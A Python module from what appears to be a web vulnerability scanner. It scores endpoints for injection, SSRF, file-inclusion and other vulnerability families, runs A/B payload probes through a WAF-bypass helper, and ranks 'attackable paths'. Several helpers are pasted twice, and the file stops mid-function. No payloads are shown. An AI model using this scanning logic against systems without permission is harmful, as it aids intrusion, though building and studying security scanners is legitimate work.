# analysis_extend.py
# ──────────────────────────────────────────────────────────────────────────────
# NEW MODULE — Precision extensions (fail-soft with WARNING logs)
# Scope: PSI · Canonical Signature · Error/Header Facts (granular) · Family KB+AI
#        A/B Multi-probe Evidence · Confidence Combinata · Cookie/Cache Audit
#        Edge/Origin (TTL-aware) · Latency Robust · Negative Controls ·
#        Top10/Quality Gate/Family Sources ASCII render (fallback)
#
# Contract:
#   - Import existing modules if present. If a dependency/function is missing,
#     *never* raise: log WARNING and skip (fail-soft).
#   - Do not mutate external global state. Only enrich per-record dicts
#     (render_ready fields) and return values.
#   - All public functions are safe to call repeatedly (idempotent on same input).
#
# Records:
#   Each `record` is the per-endpoint dict produced by probe/orchestrator with at least:
#     - url, method, status, size, latency, headers (dict[str,str]), body_snippet (str?),
#       content_type (str?), waf (str?), params (dict[str,str]|list[tuple]|None)
#   This module will *add* (if not already present):
#     - psi_score: float, psi_hits: list[str]
#     - sig_path: str, sig_params: list[str], sig_params_count: int, sig_key: str
#     - error_class: str|None, reason_codes: list[str]
#     - family: str|None, family_source: "KB"|"AI"|None, family_ai_score: float|None
#     - ab_evidence: dict|None, ab_confidence: float
#     - confidence: "HIGH"|"MED"|"LOW"
#     - cookie_audit: dict|None
#     - edge: bool|None, waf_source: "edge"|"origin"|"none"|None
#     - lat_p95: int|None, lat_iqr: int|None, lat_is_capped: bool|None
#
# Batch outputs (to attach in the final report/output dict):
#     - quality_gate_snapshot: dict
#     - family_sources_snapshot: dict
#
# Optional ASCII renderers are provided as a fallback if output_formatter is absent.

from __future__ import annotations

import logging
import math
import re
import statistics
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl
from pathlib import Path
import os, json, tempfile, logging
log = logging.getLogger("analysis_extend")
# === PATCH 1: helper robusti (incolla sotto gli import) =====================
from pathlib import Path
import os, json, tempfile, logging
from urllib.parse import urlparse, parse_qsl

log = logging.getLogger("analysis_extend")

NOISE_FLAGS = {"CB_OPEN", "SKIPPED", "TIMEOUT", "ERR_NO_DNS"}

def _as_list(x):
    if x is None: return []
    if isinstance(x, str): return [x]
    return list(x)

def _pick_writable_state_dir(features=None):
    feats = features or {}
    cfg_dir = ((feats.get("paths") or {}).get("state_dir")) or os.getenv("BG_STATE_DIR")
    candidates = [cfg_dir,
                  os.path.join(Path.home(), ".cache", "brutal_gorilla"),
                  os.path.join(tempfile.gettempdir(), "brutal_gorilla")]
    for d in candidates:
        if not d:
            continue
        try:
            p = Path(d).expanduser()
            p.mkdir(parents=True, exist_ok=True)
            test = p / ".w"; test.write_text("ok", encoding="utf-8"); test.unlink(missing_ok=True)
            return p
        except Exception:
            continue
    return None

def _safe_write_json(payload, fname, features=None):
    d = _pick_writable_state_dir(features)
    if not d:
        log.info("No writable state dir; skipping save for %s", fname); return False
    try:
        Path(d, fname).write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        return True
    except Exception as e:
        log.info("Skip save(%s): %s", fname, e); return False

def save_baseline_store(data, features=None):   # sostituisce l’eventuale versione esistente
    return _safe_write_json(data, "baseline.json", features)

def save_stored_tokens(data, features=None):    # sostituisce l’eventuale versione esistente
    return _safe_write_json(data, "stored_tokens.json", features)

def _is_attackable(rec, min_score=0.05):
    flags   = set(_as_list(rec.get("flags")))
    reasons = set(_as_list(rec.get("reason_codes")))
    score   = float(rec.get("psi_score") or 0.0)
    if flags & NOISE_FLAGS and not (reasons or score >= min_score):
        return False
    return (score >= min_score) or bool(reasons) or bool(flags - NOISE_FLAGS)

def _sig_key_of(rec):
    if rec.get("sig_key"):
        return rec["sig_key"]
    u = rec.get("url",""); p = urlparse(u)
    params = rec.get("sig_params") or [k for k,_ in sorted(parse_qsl(p.query or ""))]
    path = p.path or "/"
    return f"{path}|{','.join(params)}"

def build_top10_ascii(rows, features=None, limit=10):
    min_score = ((features or {}).get("quality_gate") or {}).get("min_score_for_top10", 0.05)
    seen = set(); cards = []
    for r in rows:
        if not _is_attackable(r, min_score):
            continue
        key = _sig_key_of(r)
        if key in seen:
            continue
        seen.add(key)
        url  = r.get("url","-")
        fam  = r.get("family","unknown")
        conf = r.get("confidence","-")
        score = int(round((r.get("psi_score") or 0.0)*100))
        reasons = ", ".join(_as_list(r.get("reason_codes")))
        cards.append((score, f"{len(seen):>2}. {score:>3}%  {fam:<8}  {conf:<4}  {url}\n    REASONS: {reasons}"))
        if len(cards) >= limit:
            break
    if not cards:
        return "No attackable paths."
    header = "════════════════════════════════ ATTACKABLE PATHS — TOP 10 ═══════════════════════════════"
    body = "\n".join(c[1] for c in sorted(cards, key=lambda x: -x[0]))
    return f"{header}\n{body}\n"

def _family_text_context(record):
    # evita NameError su extend_family_context
    return f"{record.get('method','GET')} {record.get('url','')}\nH:{record.get('headers',{})}\nB:{record.get('body','')}"
# ========================================================================== #

# === PATCH 2: family KB→policy→AI fallback =================================
def _safe_family_from_context(record, kb=None, features=None):
    try:
        import policy as _policy
    except Exception:
        return None
    # tentiamo più firme senza rompere
    ctx = {
        "url": record.get("url"),
        "method": record.get("method"),
        "params": record.get("sig_params") or list((record.get("params") or {}).keys()),
        "headers": record.get("headers") or {},
        "body": record.get("body") or "",
        "kb": kb or {},
    }
    try:
        return _policy.family_from_context(ctx, features or {})
    except TypeError:
        try:
            return _policy.family_from_context(ctx)       # vecchia firma
        except Exception:
            return None
    except Exception:
        return None

def _apply_family_ai_fallback(record, features=None):
    # evita NameError "s" non definito nei log
    try:
        import vector_store as _vs
    except Exception as e:
        log.warning("vector_store module not available: %r", e)
        return
    try:
        text = _family_text_context(record)
        cand, score = None, 0.0
        if hasattr(_vs, "guess_family"):
            cand, score = _vs.guess_family(text)
        elif hasattr(_vs, "predict_family"):
            cand, score = _vs.predict_family(text)
        if cand:
            record["family"] = cand
            record["family_source"] = "AI"
            record["family_ai_score"] = float(score or 0.0)
    except Exception as e:
        log.warning("vector_store fallback failed: %r", e)
# ========================================================================== #


def _pick_writable_state_dir(features=None):
    feats = features or {}
    cfg_dir = ((feats.get("paths") or {}).get("state_dir")) or os.getenv("BG_STATE_DIR")
    candidates = [cfg_dir,
                  os.path.join(Path.home(), ".cache", "brutal_gorilla"),
                  os.path.join(tempfile.gettempdir(), "brutal_gorilla")]
    for d in candidates:
        if not d:
            continue
        try:
            p = Path(d).expanduser()
            p.mkdir(parents=True, exist_ok=True)
            test = p / ".w"
            test.write_text("ok", encoding="utf-8"); test.unlink(missing_ok=True)
            return p
        except Exception:
            continue
    return None

def _safe_write_json(payload, fname, features=None):
    d = _pick_writable_state_dir(features)
    if not d:
        log.info("No writable state dir; skipping save for %s", fname)
        return False
    try:
        Path(d, fname).write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
        return True
    except Exception as e:
        log.info("Skip save(%s): %s", fname, e)
        return False



    def _is_attackable(rec, min_score=0.05):
        flags = set(_as_list(rec.get("flags")))
        reasons = set(_as_list(rec.get("reason_codes")))
        score = float(rec.get("psi_score") or 0.0)
        if flags & NOISE_FLAGS and not (reasons or score >= min_score):
            return False
        return (score >= min_score) or bool(reasons) or bool(flags - NOISE_FLAGS)

    def _sig_key_of(rec):
        # usa sig_key se già calcolato; altrimenti path+param ordinati
        if rec.get("sig_key"):
            return rec["sig_key"]
        u = rec.get("url", "")
        p = urlparse(u)
        params = rec.get("sig_params") or [k for k, _ in sorted(parse_qsl(p.query or ""))]
        path = p.path or "/"
        return f"{path}|{','.join(params)}"


log = logging.getLogger("analysis_extend")
if not log.handlers:
    handler = logging.StreamHandler()
    handler.setFormatter(logging.Formatter("%(levelname)s - analysis_extend - %(message)s"))
    log.addHandler(handler)
log.setLevel(logging.INFO)

# ──────────────────────────────────────────────────────────────────────────────
# Optional imports (fail-soft)
try:
    import policy  # type: ignore
except Exception as e:
    policy = None  # type: ignore
    log.warning("policy module not available: %r", e)

try:
    import ingest_normalize  # type: ignore
except Exception as e:
    ingest_normalize = None  # type: ignore
    log.warning("ingest_normalize module not available: %r", e)

try:
    import analysis_bypass  # type: ignore
except Exception as e:
    analysis_bypass = None  # type: ignore
    log.warning("analysis_bypass module not available: %r", e)

try:
    import vector_store  # type: ignore
except Exception as e:
    vector_store = None  # type: ignore
    log.warning("vector_store module not available: %r", e)

try:
    import observability  # type: ignore
except Exception as e:
    observability = None  # type: ignore
    log.warning("observability module not available: %r", e)

# Optional external renderer
try:
    from output_formatter import (
        render_attackable_paths as _of_render_attackable_paths,  # type: ignore
        render_quality_gate as _of_render_quality_gate,          # type: ignore
        render_family_sources as _of_render_family_sources,      # type: ignore
        render_cookie_audit as _of_render_cookie_audit,          # type: ignore
        render_table as _of_render_table,                        # type: ignore
        render_summary as _of_render_summary,                    # type: ignore
    )
except Exception:
    _of_render_attackable_paths = None
    _of_render_quality_gate = None
    _of_render_family_sources = None
    _of_render_cookie_audit = None
    _of_render_table = None
    _of_render_summary = None

# ──────────────────────────────────────────────────────────────────────────────
# Tunables (kept local; can be overridden by features/config if provided)
DEFAULTS = {
    "AI_MIN_SCORE": 0.60,
    "CONF_WEIGHTS": {"ab": 0.60, "psi": 0.25, "facts": 0.15},
    "PSI_HARD_HITS": {"id", "user", "uid", "token", "auth", "next", "url", "file", "path"},
    "RANK_WEIGHTS": {"score": 100.0, "ab": 30.0, "psi": 15.0, "flags": 6.0, "family": 4.0, "dup_penalty": 10.0},
    "MAX_TOP": 10,
    "LAT_MIN_SAMPLES": 3,
}

# Granular reason-code helpers (stable vocabulary)
RC = {
    "E_SQL_ERR": "E-SQL-ERR",
    "E_REFLECT": "E-REFLECT",
    "E_REFLECT_CRIT": "E-REFLECT-CRIT",
    "E_REFLECT_LOW": "E-REFLECT-LOW",
    "C_CORS_ANY": "C-CORS-ANY",
    "C_CORS_CRED": "C-CORS-CRED",
    "H_HSTS_MISS": "H-HSTS-MISS",
    "H_CSP_MISS": "H-CSP-MISS",
    "H_XFO_MISS": "H-XFO-MISS",
    "H_COOKIE_UNSAFE": "H-COOKIE-UNSAFE",
    "H_CACHE_PUBLIC": "H-CACHE-PUBLIC",
    "CT_MISMATCH": "CT-MISMATCH",
    "W_IDOR_HINT": "W-IDOR-HINT",
    "W_OPENREDIR": "W-OPENREDIR",
    "W_SSRF": "W-SSRF",
    "W_LFI": "W-LFI",
    "E_RCE_ERR": "E-RCE-ERR",
    "N_CANARY_REFLECT": "N-CANARY-REFLECT",
}

# Vulnerability families recognized (used in payload selection / scoring)
FAMILIES = {
    "SQLI", "XSS", "AUTH", "IDOR", "SSRF", "OPENREDIR", "RCE", "LFI", "RFI",
    "XXE", "DESERIAL", "JWT", "CORS", "WEAKHDRS", "MASSASSIGN", "API", "WEBPAGE"
}

# ──────────────────────────────────────────────────────────────────────────────
# Public API (record-level)

def enrich_record(record: Dict[str, Any], kb: Optional[Dict[str, Any]] = None, features: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """
    Enrich a single endpoint record with precision signals.
    Fail-soft: catch and WARN on each extension; never raise.
    """
    features = features or {}
    _ensure_lists(record)

    try:
        extend_param_sensitivity(record)
    except Exception as e:
        log.warning("extend_param_sensitivity failed: %r", e)

    try:
        extend_signature(record)
    except Exception as e:
        log.warning("extend_signature failed: %r", e)

    try:
        extend_error_header_facts(record)
    except Exception as e:
        log.warning("extend_error_header_facts failed: %r", e)

    try:
        extend_family_context(record, kb or {})
    except Exception as e:
        log.warning("extend_family_context failed: %r", e)

    try:
        extend_ab_evidence(record, features=features)
    except Exception as e:
        log.warning("extend_ab_evidence failed: %r", e)

    try:
        extend_confidence(record, features=features)
    except Exception as e:
        log.warning("extend_confidence failed: %r", e)

    try:
        extend_cookie_cache_audit(record)
    except Exception as e:
        log.warning("extend_cookie_cache_audit failed: %r", e)

    try:
        extend_edge_origin(record)
    except Exception as e:
        log.warning("extend_edge_origin failed: %r", e)
    # --- Family: KB → AI fallback ---
    fam = (record.get("family") or "unknown").lower()
    if fam in ("", "unknown", None):
        # 1) KB sui param
        params = record.get("sig_params") or []
        kb = kb or {}
        for p in params:
            fam_kb = (kb.get("param_to_family") or {}).get(p) or (kb.get("exact") or {}).get(p)
            if fam_kb:
                record["family"] = fam_kb
                record["family_source"] = "KB"
                break

    # 2) AI fallback
    fam = (record.get("family") or "unknown").lower()
    if fam in ("", "unknown", None) and (features or {}).get("family_ai", True):
        try:
            import vector_store as _vs
            text = f"{record.get('method', 'GET')} {record.get('url', '')}\n{record.get('body', '')}"
            cand, score = None, 0.0
            if hasattr(_vs, "guess_family"):
                cand, score = _vs.guess_family(text)
            elif hasattr(_vs, "predict_family"):
                cand, score = _vs.predict_family(text)
            if cand:
                record["family"] = cand
                record["family_source"] = "AI"
                record["family_ai_score"] = float(score or 0.0)
        except Exception:
            pass
    # --- PATCH 2 hook: Family → KB / policy / AI (fail-soft) ---
    fam = (record.get("family") or "unknown").lower()
    if fam in ("", "unknown", None):
        # 1) KB sui param (se presente in kb)
        kb_map = (kb or {}).get("param_to_family") or (kb or {}).get("exact") or {}
        for p in record.get("sig_params") or []:
            fam_kb = kb_map.get(p)
            if fam_kb:
                record["family"] = fam_kb
                record["family_source"] = "KB"
                break

    fam = (record.get("family") or "unknown").lower()
    if fam in ("", "unknown", None):
        # 2) policy.family_from_context (robusto)
        fam_pol = _safe_family_from_context(record, kb, features)
        if fam_pol:
            record["family"] = fam_pol
            record["family_source"] = record.get("family_source") or "KB"

    fam = (record.get("family") or "unknown").lower()
    if fam in ("", "unknown", None) and (features or {}).get("family_ai", True):
        # 3) AI fallback
        _apply_family_ai_fallback(record, features)

    return record

# ──────────────────────────────────────────────────────────────────────────────
# Public API (batch-level)

def extend_latency_stats(rows: List[Dict[str, Any]], features: Optional[Dict[str, Any]] = None) -> None:
    """
    Attach p95/IQR/capped latency fields per record if samples available,
    else compute per-record fallback using single latency.
    """
    if not rows:
        return
    if observability and hasattr(observability, "robust_latency_stats"):
        for r in rows:
            samples = r.get("latency_samples") or []
            if not samples or len(samples) < DEFAULTS["LAT_MIN_SAMPLES"]:
                # fallback from single latency
                lat = _safe_int(r.get("latency"))
                r.setdefault("lat_p95", lat)
                r.setdefault("lat_iqr", 0)
                r.setdefault("lat_is_capped", False)
                continue
            try:
                stats = observability.robust_latency_stats(samples)  # type: ignore
                r["lat_p95"] = int(stats.get("p95") or 0)
                r["lat_iqr"] = int(stats.get("iqr") or 0)
                r["lat_is_capped"] = bool(stats.get("capped") or False)
            except Exception as e:
                log.warning("robust_latency_stats failed for URL=%s: %r", r.get("url"), e)
    else:
        log.warning("observability.robust_latency_stats missing; using per-record latency fallback")
        for r in rows:
            lat = _safe_int(r.get("latency"))
            r.setdefault("lat_p95", lat)
            r.setdefault("lat_iqr", 0)
            r.setdefault("lat_is_capped", False)


def extend_negative_controls(rows: List[Dict[str, Any]]) -> None:
    """
    Evaluate canary effects across rows; annotate reasons and confidence adjustments.
    """
    if not rows:
        return
    if not (analysis_bypass and hasattr(analysis_bypass, "evaluate_canary_effect")):
        log.warning("analysis_bypass.evaluate_canary_effect missing; skipping negative controls")
        return
    for r in rows:
        try:
            res = analysis_bypass.evaluate_canary_effect(r)  # type: ignore
            if isinstance(res, dict):
                # expected keys: "reflect"|"status_diff"|"ignored"
                if res.get("reflect"):
                    _add_reason(r, RC["N_CANARY_REFLECT"])
                    # small confidence bump if already MED (not if LOW)
                    if r.get("confidence") == "MED":
                        r["confidence"] = "HIGH"
                r["ab_evidence"] = _merge_evidence(r.get("ab_evidence"), {"canary": res})
        except Exception as e:
            log.warning("evaluate_canary_effect failed for URL=%s: %r", r.get("url"), e)


def extend_quality_metrics(rows: List[Dict[str, Any]], output: Dict[str, Any]) -> None:
    """
    Compute Quality Gate snapshot and attach to output dict.
    """
    if not rows or output is None:
        return
    snapshot = {}
    if observability and hasattr(observability, "snapshot_run_metrics"):
        try:
            snapshot = observability.snapshot_run_metrics(rows)  # type: ignore
        except Exception as e:
            log.warning("snapshot_run_metrics failed: %r", e)
    else:
        snapshot = _fallback_quality_snapshot(rows)
        log.warning("observability.snapshot_run_metrics missing; using fallback snapshot")
    output["quality_gate_snapshot"] = snapshot


def extend_family_sources(rows: List[Dict[str, Any]], output: Dict[str, Any]) -> None:
    """
    Compute KB vs AI share and attach to output dict.
    """
    if not rows or output is None:
        return
    rep = {}
    if observability and hasattr(observability, "report_family_sources"):
        try:
            rep = observability.report_family_sources(rows)  # type: ignore
        except Exception as e:
            log.warning("report_family_sources failed: %r", e)
    else:
        rep = _fallback_family_sources(rows)
        log.warning("observability.report_family_sources missing; using fallback family-sources")
    output["family_sources_snapshot"] = rep

# ──────────────────────────────────────────────────────────────────────────────
# Optional Top10 builder + ASCII (fallback if you don't use output_formatter)

def build_attackable_paths(rows: List[Dict[str, Any]], max_top: Optional[int] = None) -> List[Dict[str, Any]]:
    """
    Build ranked Top-N 'cards' with SIG/EVIDENCE/REASONS/NEXT/CONTEXT.
    """
    if not rows:
        return []
    max_top = max_top or DEFAULTS["MAX_TOP"]
    weights = DEFAULTS["RANK_WEIGHTS"]

    cards: List[Dict[str, Any]] = []
    seen_sig = set()

    for r in rows:
        score = _safe_float(r.get("score"))  # 0..1
        ab = _safe_float(r.get("ab_confidence"))
        psi = _safe_float(r.get("psi_score"))
        flags_w = _flags_weight(r)
        family_w = _family_weight(r)
        sig_key = r.get("sig_key")

        rank = weights["score"] * score + weights["ab"] * ab + weights["psi"] * psi + weights["flags"] * flags_w + weights["family"] * family_w
        dup_penalty = 0.0
        if sig_key and sig_key in seen_sig:
            dup_penalty = weights["dup_penalty"]
            rank -= dup_penalty

        card = {
            "rank": round(rank, 2),
            "url": r.get("url"),
            "method": (r.get("method") or r.get("meth") or "GET"),
            "flags": _flags_string(r),
            "family": r.get("family") or "API" if "/api" in (r.get("url") or "").lower() else r.get("type") or "WEBPAGE",
            "sig": _sig_block(r),
            "evidence": _evidence_block(r),
            "reasons": _reasons_block(r),
            "next": _next_block(r),
            "context": _context_block(r),
            "confidence": r.get("confidence") or "LOW",
            "score_pct": int(round(100 * score)),
        }

        if not sig_key or sig_key not in seen_sig:
            seen_sig.add(sig_key)

        cards.append(card)

    cards.sort(key=lambda c: (-c["rank"], c["url"] or ""))

    # ensure only one per sig_key (dedup) while keeping highest rank
    final: List[Dict[str, Any]] = []
    sig_used = set()
    for c in cards:
        key = c["sig"].get("key") if isinstance(c["sig"], dict) else None
        if key and key in sig_used:
            continue
        if key:
            sig_used.add(key)
        final.append(c)
        if len(final) >= max_top:
            break
    return final


def render_attackable_paths(cards: List[Dict[str, Any]]) -> str:
    """
    ASCII fallback renderer for Top10 cards (compact).
    """
    if _of_render_attackable_paths:
        try:
            return _of_render_attackable_paths(cards)  # type: ignore
        except Exception as e:
            log.warning("external render_attackable_paths failed: %r; using fallback", e)

    if not cards:
        return "No attackable paths.\n"

    lines = []
    lines.append("════════════════════════════════ ATTACKABLE PATHS — TOP 10 ═══════════════════════════════")
    header = f"#  {'SCORE':<6} {'CONF':<5} {'FAMILY':<8} {'METH':<5} {'FLAGS':<23} {'URL'}"
    lines.append(header)
    lines.append("-- ------ ----- -------- ----- ----------------------- ---------------------------------------------------")

    for i, c in enumerate(cards, 1):
        lines.append(
            f"{i:<2} {c['rank']:<6} {c['confidence']:<5} {str(c['family'])[:8]:<8} {str(c['method'])[:5]:<5} "
            f"{str(c['flags'])[:23]:<23} {c['url'] or ''}"
        )
        # SIG
        sig = c["sig"]
        if isinstance(sig, dict) and "path" in sig and "params" in sig:
            lines.append(f"   SIG        : {{{sig['path']}?{{{','.join(sig['params'])}}}}}")
        # EVIDENCE
        lines.append(f"   EVIDENCE   : {c['evidence']}")
        # REASONS
        lines.append(f"   REASONS    : {c['reasons']}")
        # NEXT
        if c["next"]:
            lines.append(f"   NEXT       : {c['next']}")
        # CONTEXT
        lines.append(f"   CONTEXT    : {c['context']}")

    return "\n".join(lines) + "\n"


def render_quality_gate(snapshot: Dict[str, Any]) -> str:
    if _of_render_quality_gate:
        try:
            return _of_render_quality_gate(snapshot)  # type: ignore
        except Exception as e:
            log.warning("external render_quality_gate failed: %r; using fallback", e)

    if not snapshot:
        return "No QUALITY GATE data.\n"

    lines = []
    lines.append("════════════════════════════════ QUALITY GATE ════════════════════════════════════════════")
    totals = snapshot.get("totals") or {}
    high = totals.get("high", 0)
    med = totals.get("medium", 0)
    low = totals.get("low", 0)
    verdict = snapshot.get("verdict", "UNKNOWN")

    lines.append(f"Totals     High: {high} ({_pct(high, totals.get('all', 0))})   Medium: {med} ({_pct(med, totals.get('all', 0))})   Low: {low} ({_pct(low, totals.get('all', 0))})   Verdict: {verdict}")
    signals = snapshot.get("signals") or {}
    lines.append(f"Signals    Strong flags: {signals.get('strong_flags','-')}    API/AUTH surface: {signals.get('api_auth_surface','-')}    Static assets: {signals.get('static_surface','-')}")
    reliab = snapshot.get("reliability") or {}
    lines.append(f"Reliab.    A/B corroborated: {reliab.get('ab_corroborated','-')}    Edge-only blocks: {reliab.get('edge_only','-')}    CT mismatch: {reliab.get('ct_mismatch','-')}")
    lat = snapshot.get("latency") or {}
    lines.append(f"Latency    p95(ms): {lat.get('p95','-')}   IQR(ms): {lat.get('iqr','-')}   (capped outliers: {str(lat.get('capped', False)).upper()})")
    notes = snapshot.get("notes") or {}
    seeds = notes.get("seeds") or []
    if seeds:
        lines.append("Notes      Seeds to explore next: " + "  ".join(seeds[:6]))
    return "\n".join(lines) + "\n"


def render_family_sources(rep: Dict[str, Any]) -> str:
    if _of_render_family_sources:
        try:
            return _of_render_family_sources(rep)  # type: ignore
        except Exception as e:
            log.warning("external render_family_sources failed: %r; using fallback", e)

    kb_pct = int(round(100 * _safe_float(rep.get("kb_pct"))))
    ai_pct = int(round(100 * _safe_float(rep.get("ai_pct"))))
    kb_bar = "█" * max(1, kb_pct // 4)
    ai_bar = "█" * max(1, ai_pct // 4)
    lines = []
    lines.append("════════════════════════════════ FAMILY SOURCES (KB vs AI) ═══════════════════════════════")
    lines.append(f"KB  {kb_bar:<24}  {kb_pct}%")
    lines.append(f"AI  {ai_bar:<24}  {ai_pct}%")
    return "\n".join(lines) + "\n"


def render_cookie_audit(rows: List[Dict[str, Any]]) -> str:
    if _of_render_cookie_audit:
        try:
            return _of_render_cookie_audit(rows)  # type: ignore
        except Exception as e:
            log.warning("external render_cookie_audit failed: %r; using fallback", e)

    issues = []
    for r in rows:
        ca = r.get("cookie_audit") or {}
        prob = ca.get("issues") or []
        if prob:
            issues.append((r, prob))

    lines = []
    lines.append("════════════════════════════════ COOKIE & CACHE AUDIT ════════════════════════════════════")
    if not issues:
        lines.append("No cookie/cache issues detected.")
        return "\n".join(lines) + "\n"

    lines.append(f"{'Host/Path':<43} {'Issues'}")
    lines.append(f"{'-'*43} {'-'*55}")
    for r, probs in issues:
        host = urlparse(r.get("url") or "").hostname or "-"
        path = urlparse(r.get("url") or "").path or "/"
        lines.append(f"{host:<30} {path:<12} {', '.join(probs)[:80]}")
    return "\n".join(lines) + "\n"

# ──────────────────────────────────────────────────────────────────────────────
# Extensions (record-level)

def extend_param_sensitivity(record: Dict[str, Any]) -> None:
    params = _extract_params(record)
    if "psi_score" in record and "psi_hits" in record:
        return
    # Prefer policy.param_sensitivity_index
    if policy and hasattr(policy, "param_sensitivity_index"):
        try:
            res = policy.param_sensitivity_index(set(params.keys()))  # type: ignore
            record["psi_score"] = float(res.get("score") or 0.0)
            record["psi_hits"] = list(res.get("hits") or [])
            return
        except Exception as e:
            log.warning("policy.param_sensitivity_index failed: %r; using fallback PSI", e)
    # Fallback lightweight PSI
    hits = [k for k in params.keys() if k.lower() in DEFAULTS["PSI_HARD_HITS"]]
    score = 0.0
    for k in hits:
        score += 0.2 if k.lower() in {"token", "auth"} else 0.12 if k.lower() in {"id", "uid", "user"} else 0.10
    record["psi_score"] = min(1.0, round(score, 4))
    record["psi_hits"] = hits


def extend_signature(record: Dict[str, Any]) -> None:
    if all(k in record for k in ("sig_path", "sig_params", "sig_params_count", "sig_key")):
        return
    url = record.get("url") or ""
    if ingest_normalize and hasattr(ingest_normalize, "canonical_signature"):
        try:
            sig = ingest_normalize.canonical_signature(url)  # type: ignore
            record["sig_path"] = sig.get("path_sig")
            params = sig.get("param_sig") or []
            record["sig_params"] = list(sorted(params))
            record["sig_params_count"] = len(record["sig_params"])
            record["sig_key"] = sig.get("sig_key")
            return
        except Exception as e:
            log.warning("ingest_normalize.canonical_signature failed: %r; using fallback signature", e)

    # Fallback signature: normalize digits in path and sort params
    p = urlparse(url)
    path_sig = re.sub(r"/\d+(/|$)", "/{id}\\1", (p.path or "/"))
    params = sorted([k for k, _ in parse_qsl(p.query, keep_blank_values=True)])
    record["sig_path"] = path_sig
    record["sig_params"] = params
    record["sig_params_count"] = len(params)
    record["sig_key"] = f"{path_sig}?{{{','.join(params)}}}"


def extend_error_header_facts(record: Dict[str, Any]) -> None:
    headers = record.get("headers") or {}
    body = record.get("body_snippet") or record.get("body") or ""
    record.setdefault("reason_codes", [])

    # classify_error
    err_cls = None
    if analysis_bypass and hasattr(analysis_bypass, "classify_error"):
        try:
            err_cls = analysis_bypass.classify_error(body, headers)  # type: ignore
        except Exception as e:
            log.warning("classify_error failed for URL=%s: %r", record.get("url"), e)
    # header facts
    facts = {}
    if analysis_bypass and hasattr(analysis_bypass, "extract_header_facts"):
        try:
            facts = analysis_bypass.extract_header_facts(headers)  # type: ignore
        except Exception as e:
            log.warning("extract_header_facts failed for URL=%s: %r", record.get("url"), e)

    if err_cls:
        record["error_class"] = err_cls
        _add_reason(record, RC["E_SQL_ERR"])

    # map facts to reason_codes (fail-soft — only if keys known)
    _map_header_facts_to_reasons(record, facts, headers)


def extend_family_context(record: Dict[str, Any], kb: Dict[str, Any]) -> None:
    # Prefer policy.family_from_context (which itself may call AI)
    fam, source, ai_score = None, None, None

    if policy and hasattr(policy, "family_from_context"):
        try:
            res = policy.family_from_context(record, kb)  # type: ignore
            fam = res.get("family")
            source = res.get("source")
            ai_score = res.get("ai_score") or res.get("family_ai_score")
        except Exception as e:
            log.warning("policy.family_from_context failed: %r; trying vector_store fallback", e)

    if not fam and vector_store and hasattr(vector_store, "semantic_family_vote"):
        try:
            ctx = _family_text_context(record)
            ai = vector_store.semantic_family_vote(ctx)  # type: ignore
            if ai and ai.get("family") and _safe_float(ai.get("score")) >= DEFAULTS["AI_MIN_SCORE"]:
                fam = ai.get("family")
                source = "AI"
                ai_score = float(ai.get("score"))
        except Exception as e:
            log.warning("vector_store.semantic_family_vote failed: %r", e)

    if fam:
        record["family"] = fam
        record["family_source"] = source or "KB"
        if ai_score is not None:
            record["family_ai_score"] = float(ai_score)


def extend_ab_evidence(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:
    """
    Build multi-probe payload set based on params & family hints, then call ab_compare.
    Combines boolean|error|time modalities; validates reflection context; aggregates confidence.
    """
    if not (analysis_bypass and hasattr(analysis_bypass, "ab_compare")):
        log.warning("analysis_bypass.ab_compare missing; skipping A/B evidence")
        record.setdefault("ab_confidence", 0.0)
        return

    url = record.get("url") or ""
    params = _extract_params(record)

    # Build payloads per family (only for present params to lower noise)
    payloads = _build_payloads_for_record(record, params)

    evidence_bag = {}
    max_conf = 0.0
    # Run ab_compare once with grouped payloads (preferred if ab_compare supports it)
    try:
        res = analysis_bypass.ab_compare(url, params, payloads)  # type: ignore
        # Expected shape (by design): dict with per-family/per-variant results
        if isinstance(res, dict):
            evidence_bag = res
            max_conf = _aggregate_ab_confidence(res, record)
    except Exception as e:
        log.warning("ab_compare failed for URL=%s: %r", url, e)

    # Reflection context classification (XSS precision)
    try:
        refl = _collect_reflections(evidence_bag)
        if refl:
            level = _validate_reflection_context(record, refl)
            _add_reason(record, RC["E_REFLECT_CRIT"] if level == "critical" else RC["E_REFLECT_LOW"])
    except Exception as e:
        log.warning("validate_reflection_context failed: %r", e)

    # Heuristic add-ons from markers (reduce FP / add reasons)
    _markers_to_reasons(record, evidence_bag)

    record["ab_evidence"] = evidence_bag or None
    record["ab_confidence"] = round(max_conf, 4)


def extend_confidence(record: Dict[str, Any], features: Optional[Dict[str, Any]] = None) -> None:
    """
    Confidence = weighted(ab_confidence, psi_score, reason_codes_strength)
    Map to HIGH / MED / LOW with robust thresholds.
    """
    W = (features or {}).get("conf_weights") or DEFAULTS["CONF_WEIGHTS"]
    ab = _safe_float(record.get("ab_confidence"))
    psi = _safe_float(record.get("psi_score"))
    facts = _reasons_strength(record.get("reason_codes") or [])

    score = W["ab"] * ab + W["psi"] * psi + W["facts"] * facts
    # Robust mapping (bias towards MED to avoid false HIGH)
    level = "LOW"
    if score >= 0.70 or (ab >= 0.6 and facts >= 0.4):
        level = "HIGH"
    elif score >= 0.35:
        level = "MED"
    record["confidence"] = level


def extend_cookie_cache_audit(record: Dict[str, Any]) -> None:
    if not (analysis_bypass and hasattr(analysis_bypass, "cookie_cache_audit")):
        # Fallback: minimal heuristic on Set-Cookie/Cache-Control only on sensitive paths
        if _is_sensitive_path(record):
            issues = _simple_cookie_cache_check(record.get("headers") or {})
            if issues:
                ca = {"issues": issues, "facts": {}}
                record["cookie_audit"] = ca
                for code in issues:
                    _add_reason(record, code)
        else:
            record.setdefault("cookie_audit", None)
        return

    try:
        ca = analysis_bypass.cookie_cache_audit(record)  # type: ignore
        if ca and isinstance(ca, dict) and ca.get("issues"):
            record["cookie_audit"] = ca
            for code in ca.get("issues") or []:
                _add_reason(record, code)
    except Exception as e:
        log.warning("cookie_cache_audit failed for URL=%s: %r", record.get("url"), e)


def extend_edge_origin(record: Dict[str, Any]) -> None:
    headers = record.get("headers") or {}
    dns_hints = {"ttl": record.get("dns_ttl")}
    if analysis_bypass and hasattr(analysis_bypass, "detect_edge_origin"):
        try:
